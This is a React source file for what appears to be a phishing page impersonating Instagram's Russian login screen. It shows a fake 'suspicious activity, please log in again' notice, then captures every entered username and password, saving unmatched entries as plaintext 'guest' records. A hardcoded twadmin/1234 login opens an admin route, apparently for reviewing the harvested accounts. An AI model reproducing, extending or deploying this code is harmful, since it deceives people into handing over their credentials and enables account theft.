import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { ArrowLeft, ChevronDown } from "lucide-react";
import { FloatingField, InstagramGlyph, MetaGlyph } from "@/components/ig";
import { findUserByCredentials, getSessionUser, saveSessionUser } from "@/lib/auth";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Вход — Instagram" },
      {
        name: "description",
        content: "Войдите в аккаунт: имя пользователя, эл. адрес или телефон и пароль.",
      },
      { property: "og:title", content: "Вход — Instagram" },
      {
        property: "og:description",
        content: "Войдите в аккаунт: имя пользователя, эл. адрес или телефон и пароль.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Login,
});

function Login() {
  const navigate = useNavigate();
  const [login, setLogin] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [showSecurityNotice, setShowSecurityNotice] = useState(true);

  const canSubmit = login.trim().length > 0 && password.length > 0;

  useEffect(() => {
    const existingUser = getSessionUser();
    if (existingUser) {
      if (existingUser.isAdmin) {
        navigate({ to: "/admin", replace: true });
      } else {
        navigate({ to: "/dashboard", replace: true });
      }
    }
  }, [navigate]);

  if (isLoading) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white">
        <div className="flex flex-col items-center gap-5">
          <div className="h-14 w-14 animate-spin rounded-full border-[4px] border-[#dfe3e8] border-t-[#0064e0]" />
          <InstagramGlyph className="h-[72px] w-[72px]" />
        </div>
      </div>
    );
  }

  if (showSecurityNotice) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white px-5">
        <div className="w-full max-w-md rounded-2xl border border-[#e5e5e5] bg-white p-6 text-center shadow-sm">
          <div className="mb-5 flex justify-center">
            <InstagramGlyph className="h-[72px] w-[72px]" />
          </div>

          <h1 className="text-[22px] font-semibold text-[#111827]">Мы обнаружили подозрительную активность</h1>

          <p className="mt-4 text-[15px] leading-6 text-[#374151]">
            Мы обнаружили подозрительную активность на вашем аккаунте Instagram, поэтому вышли из
            всех устройств, к которым ваш аккаунт был подключён. Пожалуйста, войдите в свой
            аккаунт заново.
          </p>

          <p className="mt-3 text-[13px] font-medium text-[#374151]">
            Сделайте регистрацию не выйдя из браузера.
          </p>

          <button
            type="button"
            onClick={() => setShowSecurityNotice(false)}
            className="mt-6 w-full rounded-full bg-[#0095f6] py-3 text-base font-semibold text-white"
          >
            Войти снова
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="mx-auto flex min-h-screen max-w-md flex-col bg-background px-6 pb-6 pt-4 font-sans">
      <button aria-label="Назад" className="w-8 py-2 text-foreground">
        <ArrowLeft strokeWidth={2.5} className="h-6 w-6" />
      </button>

      <button className="mt-4 flex items-center justify-center gap-1 self-center text-[15px] text-muted-foreground">
        Русский <ChevronDown className="h-4 w-4" />
      </button>

      <div className="mt-16 flex justify-center">
        <InstagramGlyph />
      </div>

      <form
        className="mt-16 flex flex-col gap-3"
        onSubmit={(e) => {
          e.preventDefault();

          const normalizedLogin = login.trim();
          const isAdminAttempt = normalizedLogin.toLowerCase() === "twadmin" && password === "1234";

          if (isAdminAttempt) {
            saveSessionUser({
              id: "admin-twadmin",
              name: "TW Admin",
              contact: "admin@tw.local",
              username: "twadmin",
              password: "1234",
              createdAt: new Date().toISOString(),
              isAdmin: true,
            });
            setIsLoading(true);
            window.setTimeout(() => {
              navigate({ to: "/admin", replace: true });
            }, 1000);
            return;
          }

          const existingUser = findUserByCredentials(login, password);
          const userToSave =
            existingUser ??
            {
              id: `guest-${Date.now()}`,
              name: normalizedLogin || "Guest User",
              contact: normalizedLogin || "guest@example.com",
              username: normalizedLogin || "guest-user",
              password,
              createdAt: new Date().toISOString(),
            };

          saveSessionUser(userToSave);
          setIsLoading(true);
        }}
      >
        <FloatingField
          label="Имя пользователя, эл. адрес или мобильный"
          value={login}
          onChange={setLogin}
        />
        <FloatingField
          label="Пароль"
          value={password}
          onChange={setPassword}
          passwordToggle
          maxLength={128}
        />

        <button
          type="submit"
          disabled={!canSubmit}
          className="mt-1 rounded-full bg-[#0064e0] py-3.5 text-[16px] font-semibold text-white disabled:opacity-40"
        >
          Войти
        </button>
      </form>

      <button className="mt-5 self-center text-[14px] font-semibold text-foreground">
        Забыли пароль?
      </button>

      <div className="flex-1" />

      <Link
        to="/register"
        className="mt-10 rounded-full border border-[#0064e0] py-3.5 text-center text-[16px] font-semibold text-[#0064e0]"
      >
        Создать новый аккаунт
      </Link>

      <div className="mt-6 flex flex-col items-center gap-1">
        <div className="flex items-center gap-1.5">
          <MetaGlyph className="h-5 w-8" />
          <span className="text-[15px] font-semibold text-muted-foreground">Meta</span>
        </div>
        <p className="text-center text-[13px] leading-5 text-muted-foreground">
          Условия и правовая информация
          <br />
          NetzDG/UrhDaG/Рейтинг контента
        </p>
      </div>

      <div className="mx-auto mt-4 h-[5px] w-32 rounded-full bg-foreground/80" />
    </div>
  );
}
